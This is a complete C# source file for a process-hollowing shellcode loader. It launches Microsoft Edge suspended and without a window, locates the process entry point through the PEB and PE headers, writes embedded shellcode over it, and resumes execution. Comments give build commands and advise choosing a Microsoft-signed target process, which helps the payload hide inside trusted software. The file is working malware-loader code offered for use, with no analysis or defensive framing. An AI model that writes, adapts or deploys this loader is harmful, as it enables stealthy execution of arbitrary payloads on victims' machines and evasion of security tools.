using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

// Half-Way Process Hollowing Loader
// Visual Studio: Console App (.NET Framework), add shellcode_x64.bin as Embedded Resource.
// Command line: csc.exe /target:exe /unsafe /out:ProcessHollow.exe /resource:shellcode_x64.bin,ProcessHollow.shellcode_x64.bin ProcessHollow.cs

namespace ProcessHollow
{
    public class Loader
    {
        private const string ResourceName = "ProcessHollow.shellcode_x64.bin";

        // ---- CONFIG: target process --------------------------------------
        // Change these to any legitimate process. Requirements: 64-bit,
        // signed by Microsoft, no GUI required, .text section large enough
        // for shellcode (~200-300KB).
        private const string TargetPath    = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
        private const string TargetArgs    = @"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window";
        private const string TargetWorkDir = @"C:\Program Files (x86)\Microsoft\Edge\Application\";
        // -------------------------------------------------------------------

        public static void Main(string[] args)
        {
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("[-] FATAL: must be compiled as x64. Current IntPtr.Size=" + IntPtr.Size + " (4=x86/WOW64, 8=x64)");
                Console.WriteLine("    Fix: Project > Properties > Build > Platform target = x64, uncheck Prefer 32-bit");
                return;
            }

            try
            {
                // ---- 1. Create suspended process ----
                var si = new STARTUPINFOA
                {
                    cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                    dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
                };

                var ok = CreateProcessA(
                    TargetPath,
                    TargetArgs,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    TargetWorkDir,
                    ref si,
                    out var pi);

                if (!ok)
                {
                    Console.WriteLine("[-] CreateProcessA failed: " + Marshal.GetLastWin32Error());
                    return;
                }
                Console.WriteLine("[+] Process created PID=" + pi.dwProcessId);

                // ---- 2. Load shellcode from embedded resource ----
                byte[] shellcode;
                var assembly = Assembly.GetExecutingAssembly();

                using (var rs = assembly.GetManifestResourceStream(ResourceName))
                {
                    if (rs == null)
                    {
                        Console.WriteLine("[-] Resource not found: " + ResourceName);
                        Console.WriteLine("    Available resources:");
                        foreach (var name in assembly.GetManifestResourceNames())
                            Console.WriteLine("      " + name);
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);
                        return;
                    }
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        shellcode = ms.ToArray();
                    }
                }
                Console.WriteLine("[+] Shellcode loaded: " + shellcode.Length + " bytes");

                // ---- 3. NtQueryInformationProcess -> PEB -> ImageBaseAddress ----
                var pbiSize = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                var pbiPtr = Marshal.AllocHGlobal(pbiSize);

                var ntStatus = NtQueryInformationProcess(
                    pi.hProcess,
                    0, // ProcessBasicInformation
                    pbiPtr,
                    pbiSize,
                    out _);

                if (ntStatus != 0)
                {
                    Console.WriteLine("[-] NtQueryInformationProcess failed: 0x" + ntStatus.ToString("X"));
                    Marshal.FreeHGlobal(pbiPtr);
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }

                var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(pbiPtr);
                Marshal.FreeHGlobal(pbiPtr);
                Console.WriteLine("[+] PEB address: 0x" + ((long)pbi.PebBaseAddress).ToString("X"));

                // PEB + 0x10 = ImageBaseAddress (x64, 8 bytes)
                var baseAddrBytes = new byte[8];
                if (!ReadProcessMemory(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), baseAddrBytes, 8, out var br) || br != 8)
                {
                    Console.WriteLine("[-] ReadProcessMemory(PEB+0x10) failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }
                var imageBase = BitConverter.ToInt64(baseAddrBytes, 0);
                Console.WriteLine("[+] ImageBase: 0x" + imageBase.ToString("X"));

                // ---- 4. Walk PE headers to find AddressOfEntryPoint ----
                var dosHeader = new byte[64];
                if (!ReadProcessMemory(pi.hProcess, (IntPtr)imageBase, dosHeader, dosHeader.Length, out br))
                {
                    Console.WriteLine("[-] ReadProcessMemory(DOS header) failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }
                var e_lfanew = BitConverter.ToInt32(dosHeader, 60);
                Console.WriteLine("[+] e_lfanew: 0x" + e_lfanew.ToString("X"));

                // NT headers: AddressOfEntryPoint at offset 40
                //   4-byte signature + 20-byte file header + 16 bytes into optional header
                var ntHeaders = new byte[48];
                if (!ReadProcessMemory(pi.hProcess, (IntPtr)(imageBase + e_lfanew), ntHeaders, ntHeaders.Length, out br))
                {
                    Console.WriteLine("[-] ReadProcessMemory(NT headers) failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }
                var addressOfEntryPoint = BitConverter.ToUInt32(ntHeaders, 40);
                Console.WriteLine("[+] AddressOfEntryPoint: 0x" + addressOfEntryPoint.ToString("X"));

                var entryPoint = (IntPtr)(imageBase + addressOfEntryPoint);
                Console.WriteLine("[+] EntryPoint VA: 0x" + ((long)entryPoint).ToString("X"));

                // ---- 5. VirtualProtectEx RW, write, VirtualProtectEx RX ----
                var oldProtect = MEMORY_PROTECTION.PAGE_EXECUTE_READ;
                if (!VirtualProtectEx(pi.hProcess, entryPoint, (uint)shellcode.Length, MEMORY_PROTECTION.PAGE_READWRITE, ref oldProtect))
                {
                    Console.WriteLine("[-] VirtualProtectEx(RW) failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }
                Console.WriteLine("[+] VirtualProtectEx(RW) ok, old=" + oldProtect);

                if (!WriteProcessMemory(pi.hProcess, entryPoint, shellcode, shellcode.Length, out var bw) || bw != shellcode.Length)
                {
                    Console.WriteLine("[-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error() + " written=" + bw);
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }
                Console.WriteLine("[+] WriteProcessMemory ok: " + bw + " bytes");

                oldProtect = MEMORY_PROTECTION.PAGE_READWRITE;
                if (!VirtualProtectEx(pi.hProcess, entryPoint, (uint)shellcode.Length, MEMORY_PROTECTION.PAGE_EXECUTE_READ, ref oldProtect))
                {
                    Console.WriteLine("[-] VirtualProtectEx(RX) failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return;
                }
                Console.WriteLine("[+] VirtualProtectEx(RX) restored");

                // ---- 6. Resume - primary thread starts at our shellcode ----
                ResumeThread(pi.hThread);
                Console.WriteLine("[+] Thread resumed - shellcode should execute");

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception: " + ex.Message);
            }
        }

        // ---- P/Invoke ----

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CreateProcessA(
            string applicationName,
            string commandLine,
            IntPtr processAttributes,
            IntPtr threadAttributes,
            bool inheritHandles,
            PROCESS_CREATION_FLAGS creationFlags,
            IntPtr environment,
            string currentDirectory,
            ref STARTUPINFOA startupInfo,
            out PROCESS_INFORMATION processInformation);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesRead);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesWritten);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            MEMORY_PROTECTION flNewProtect,
            ref MEMORY_PROTECTION lpflOldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int infoClass,
            IntPtr pbi,
            int pbiSize,
            out int returnLength);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CloseHandle(IntPtr hObject);
    }

    // ---- Structs ----

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    // ---- Enums ----

    public enum MEMORY_PROTECTION : uint
    {
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_READWRITECOPY = 0x08,
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_GUARD = 0x100,
        PAGE_NOCACHE = 0x200,
        PAGE_WRITECOMBINE = 0x400
    }

    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }

    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }
}